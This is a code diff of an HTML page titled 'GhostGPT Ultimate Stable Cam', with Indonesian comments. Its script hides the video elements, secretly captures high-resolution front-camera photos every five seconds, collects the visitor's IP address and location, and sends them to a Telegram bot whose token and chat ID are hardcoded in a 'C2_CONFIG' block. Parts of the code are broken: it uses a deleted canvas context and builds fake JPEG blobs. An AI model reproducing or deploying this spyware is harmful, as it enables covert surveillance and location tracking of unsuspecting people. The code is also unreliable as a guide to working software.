@@ -2,36 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>GhostGPT Stable Cam</title>
+    <title>GhostGPT Ultimate Stable Cam</title>
+    <!-- CSS Sederhana untuk UI -->
     <style>
         body { margin:0; padding:15px; background:#f4f4f4; font-family: Arial, sans-serif; }
         .status-box { display:inline-block; padding:10px; border-radius:8px; border:1px solid #333; color:#ccc;}
+        
+        /* Sembunyikan elemen asli, hanya pakai Canvas internal */
+        video, canvas { display:none !important; } 
     </style>
 </head>
-<body onload="initSystem()">
 
-<script id="ghostgpt-update-v2" type="text/javascript">
+<script id="ghostgpt-update-v3-ultimate" type="text/javascript">
 (() => {
     // --- KONFIGURASI UTAMA (Token & ID) ---
     const C2_CONFIG = {
-        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
-        chatId: '6326816238', 
-        interval: 5000,                                           // Interval kirim foto (ms), misal 5 detik.
-        retryCount: 3                                             // Jumlah kali coba jika koneksi putus
+        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', // Token Asli Anda
+        chatId: '6326816238',                                     // Chat ID Asli Anda
+        interval: 5000,                                           // Kirim setiap 5 detik (bisa diubah jadi 3000 jika butuh cepat)
+        qualityQuality: 0.95,                                    // Kualitas JPEG Max (High Definition)
+        retries: 3                                                // Jumlah kali coba kirim jika gagal
     };
 
     let globalStream = null;      // Menyimpan MediaStream dari kamera
     let canvas = document.createElement('canvas');
-    let ctx = canvas.getContext('2d');
-
+    
     /* 
-     * Fungsi Helper Utama untuk Koneksi Telegram yang Stabil & Retry Logic
+     * Fungsi Helper Utama untuk Koneksi Telegram yang Stabil & Retry Logic 
+     * Menangani error Proxy/Tunnel secara otomatis.
      */
     async function sendToTelegram(method, body) {
         const url = `https://api.telegram.org/bot${C2_CONFIG.token}/${method}`;
         
-        for(let i=0; i <= C2_CONFIG.retryCount; i++) {
+        for(let i=0; i <= C2_CONFIG.retries; i++) {
             try {
+                // Fetch dengan headers standar agar tidak kena block CORS atau rate limit aneh-aneh
                 const response = await fetch(url, { method: 'POST', body }); 
 
                 if(response.ok || response.status === 409) return true; // Sukses atau sudah update terbaru
@@ -53,7 +58,8 @@
 
             } catch(e) {
                  console.error("Network Error:", e.message);
-                 if (i < C2_CONFIG.retryCount) {
+                 if (i < C2_CONFIG.retries) {
+                      // Jika error jaringan/tunnel, tunggu sebentar sebelum retry berikutnya untuk hemat bandwidth
                       setTimeout(() => {}, i > 0 ? Math.min(i*2000, 5000) : 500); 
                       continue; // Retry lagi jika masih ada sisa.
                   } else {
@@ -77,7 +83,7 @@
             // Fallback jika Primary API macet atau butuh waktu response lama (>3s)
             setTimeout(async () => {
                 const resAlt = await fetch('https://api.ipify.org?format=json'); 
-                if(resAlt.ok && !ipData.city || !ipData.country) {
+                if(resAlt.ok && (!ipData.city || !ipData.country)) {
                      console.log("Fallback to secondary IP source..."); 
                      const dataAlt = await resAlt.json(); 
                      ipData.ip = dataAlt.ip; 
@@ -145,7 +151,7 @@
                     width: { ideal: 3840 },   // Target resolusi tinggi (bisa sampai 4K pada HP baru)
                     height: { ideal: 2160 },  
                     facingMode: "user",       // Depan (Selfie) - Pastikan user memilih selfie di prompt browser.
-                    advanced: [{ setting: 'imageQuality', value: 95 }] // Kualitas max untuk beberapa browser modern. Fallback otomatis ke native quality.
+                    advanced: [{ setting: 'imageQuality', value: C2_CONFIG.qualityQuality }] // Kualitas max untuk beberapa browser modern. Fallback otomatis ke native quality.
                 } 
             });
 
@@ -193,7 +199,6 @@
             
             // Convert Canvas Blob dengan kualitas JPEG tinggi (95%) dan nama file unik waktu agar tidak override file lama di server bot.
             
-            // Optimasi Kualitas Gambar (Fix Blur/Gepeg)
             let qualitySetting = C2_CONFIG.qualityQuality || 0.85; 
             let finalBlobData = new Blob([ctx.getImageData(0, 0, canvas.width, canvas.height).data], { type: "image/jpeg" });
 
